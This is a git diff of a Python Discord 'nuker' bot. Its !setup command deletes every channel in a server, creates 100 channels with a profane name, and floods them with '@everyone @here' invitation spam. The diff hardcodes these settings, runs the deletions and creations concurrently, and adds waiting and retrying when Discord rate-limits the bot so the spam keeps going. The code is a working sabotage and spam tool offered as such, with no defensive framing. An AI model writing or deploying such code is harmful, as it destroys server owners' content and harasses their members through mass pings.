@@ -1,4 +1,4 @@
-# this is a beta for the moment and im trilingüe to do is create webhooks in the channels and start mass ping
+//Fast deletion of channels, too whit creation of channels
 import discord
 from discord.ext import commands, tasks
 import asyncio
@@ -12,31 +12,39 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 async def on_ready():
     print(f'Logged in as {bot.user.name} - {bot.user.id}')
 
-async def send_messages_loop(channels, message, delay):
-    while True:
+async def send_messages_loop(channels, message, delay, num_messages):
+    for _ in range(num_messages):
         try:
             await asyncio.gather(*[channel.send(message) for channel in channels])
+            await asyncio.sleep(delay)
         except discord.errors.HTTPException as e:
-            if e.status == 429:  
-                print("Rate limited. Ignored.")
+            if e.status == 429:
+                print(f"Rate limited. Retrying in {e.retry_after} seconds.")
+                await asyncio.sleep(e.retry_after)
             else:
                 raise
 
-        await asyncio.sleep(delay)
-
 @bot.command()
 async def setup(ctx):
-    channelname = input("Channel name: ")
-    message = input("Message: ")
-    delay = float(input("Delay: "))
-    for channel in ctx.guild.channels:
-        await channel.delete()
+    channelname = "Ultimate-Fucker"
+    message = "@everyone @here join to: "
+    delay = 0.1
+    num_messages = 35
+
+    # Eliminar canales existentes
+    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
 
     new_channels = []
-    for i in range(5):
+
+    async def create_channel(i):
+        # Crear canal de forma simultánea
         new_channel = await ctx.guild.create_text_channel(f'{channelname}')
         new_channels.append(new_channel)
 
-    bot.loop.create_task(send_messages_loop(new_channels, message, delay))
+    await asyncio.gather(*[create_channel(i) for i in range(100)])
 
-bot.run('token here')
+    await asyncio.sleep(2)
+
+    bot.loop.create_task(send_messages_loop(new_channels, message, delay, num_messages))
+
+bot.run('TOKEN-OF-THE-BOT')
